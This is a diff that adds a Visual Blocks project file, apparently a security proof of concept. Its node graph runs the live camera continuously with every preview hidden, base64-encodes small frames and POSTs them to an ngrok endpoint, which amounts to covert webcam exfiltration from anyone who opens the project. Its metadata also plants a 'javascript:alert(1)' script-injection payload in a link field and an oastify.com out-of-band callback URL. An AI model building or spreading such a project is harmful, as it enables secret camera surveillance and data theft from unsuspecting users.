@@ -1,0 +1,206 @@
+{
+  "project": {
+    "id": "d3h1au",
+    "name": "camera2",
+    "creationTs": 1735634242349,
+    "lastModifiedTs": 1735722353047,
+    "userSetData": {
+      "description": "descriptions",
+      "tags": [],
+      "contactURL": "https://6gnmhosw0zg85xaxk48x4c574yapytmi.oastify.com",
+      "tutorialYouTube": "javascript:alert(1)"
+    }
+  },
+  "graph": {
+    "nodes": [
+      {
+        "id": "custom_api_vmpgjc",
+        "nodeSpecId": "custom_api",
+        "customData": {
+          "initialWidth": 304,
+          "initialHeight": 368,
+          "previewX": 1360,
+          "previewY": 16,
+          "previewWidth": 352,
+          "previewHeight": 240
+        },
+        "uiData": {
+          "posX": -224,
+          "posY": -224,
+          "width": 240,
+          "height": 255,
+          "selected": false
+        },
+        "propValues": {
+          "type": "post",
+          "immediateMode": true,
+          "hidePreview": true
+        },
+        "inputValues": {
+          "endpointUrl": "https://d380-176-228-157-97.ngrok-free.app",
+          "payloadJson": "",
+          "apiKey": ""
+        },
+        "incomingEdges": {
+          "payloadJson": [
+            {
+              "sourceNodeId": "logger-node_w2msc8",
+              "outputId": "json"
+            }
+          ]
+        }
+      },
+      {
+        "id": "logger-node_w2msc8",
+        "nodeSpecId": "logger-node",
+        "customData": {
+          "previewX": 1072,
+          "previewY": 16,
+          "previewWidth": 272,
+          "previewHeight": 224
+        },
+        "uiData": {
+          "posX": -528,
+          "posY": -144,
+          "width": 176,
+          "height": 69,
+          "selected": false
+        },
+        "inputValues": {
+          "data": []
+        },
+        "incomingEdges": {
+          "data": [
+            {
+              "sourceNodeId": "custom-script_rndat3",
+              "outputId": "strResult"
+            }
+          ]
+        }
+      },
+      {
+        "id": "custom-script_rndat3",
+        "nodeSpecId": "custom-script",
+        "customData": {
+          "initialWidth": 304,
+          "initialHeight": 368,
+          "sandboxed": true,
+          "previewX": 752,
+          "previewY": 16,
+          "previewWidth": 304,
+          "previewHeight": 368
+        },
+        "uiData": {
+          "posX": -800,
+          "posY": -144,
+          "width": 176,
+          "height": 105,
+          "selected": false
+        },
+        "propValues": {
+          "curCode": "// Use `strings` to access the input string array.\n// Use `return` to return the result at the end.\n//\n// Note: the code will be executed in an async function,\n// so you can use `await` for async tasks.\n//\n// Example:\n//\n// const a = strings[0];\n// const b = strings[1];\n// const c = await asyncTask();\n// return a + ', ' + b + ', ' + c;\n\nreturn {img:strings[0]}",
+          "hidePreview": true
+        },
+        "inputValues": {
+          "strings": []
+        },
+        "incomingEdges": {
+          "strings": [
+            {
+              "sourceNodeId": "image_to_base64_qr8er7",
+              "outputId": "base64"
+            }
+          ]
+        }
+      },
+      {
+        "id": "image_to_base64_qr8er7",
+        "nodeSpecId": "image_to_base64",
+        "customData": {
+          "previewX": 16,
+          "previewY": 16,
+          "previewWidth": 320,
+          "previewHeight": 240
+        },
+        "uiData": {
+          "posX": -1072,
+          "posY": -144,
+          "width": 176,
+          "height": 69,
+          "selected": false
+        },
+        "incomingEdges": {
+          "image": [
+            {
+              "sourceNodeId": "image_processor_v4kxdq",
+              "outputId": "image"
+            }
+          ]
+        }
+      },
+      {
+        "id": "image_processor_v4kxdq",
+        "nodeSpecId": "image_processor",
+        "customData": {
+          "initialWidth": 480,
+          "initialHeight": 384,
+          "previewX": 368,
+          "previewY": 16,
+          "previewWidth": 368,
+          "previewHeight": 304
+        },
+        "uiData": {
+          "posX": -1344,
+          "posY": -144,
+          "width": 176,
+          "height": 253,
+          "selected": false
+        },
+        "propValues": {
+          "hidePreview": true,
+          "resize": {
+            "width": 20,
+            "height": 20
+          },
+          "resize,,,width": 20,
+          "resize,,,height": 20
+        },
+        "incomingEdges": {
+          "image": [
+            {
+              "sourceNodeId": "live_camera_487yi4",
+              "outputId": "image"
+            }
+          ]
+        }
+      },
+      {
+        "id": "live_camera_487yi4",
+        "nodeSpecId": "live_camera",
+        "customData": {
+          "runContinuously": true,
+          "initialWidth": 240,
+          "initialHeight": 320,
+          "previewX": 16,
+          "previewY": 16,
+          "previewWidth": 240,
+          "previewHeight": 320
+        },
+        "uiData": {
+          "posX": -1728,
+          "posY": -240,
+          "width": 176,
+          "height": 105,
+          "selected": false
+        },
+        "propValues": {
+          "hidePreview": true
+        }
+      }
+    ]
+  },
+  "customNodeUrls": [
+    "https://storage.googleapis.com/tfweb/visualblocks-github-bundles/@visualblocks/gemini@latest/dist/bundle.js",
+    "https://cdn.jsdelivr.net/npm/huggingface-visualblocks-nodes@latest"
+  ]
+}
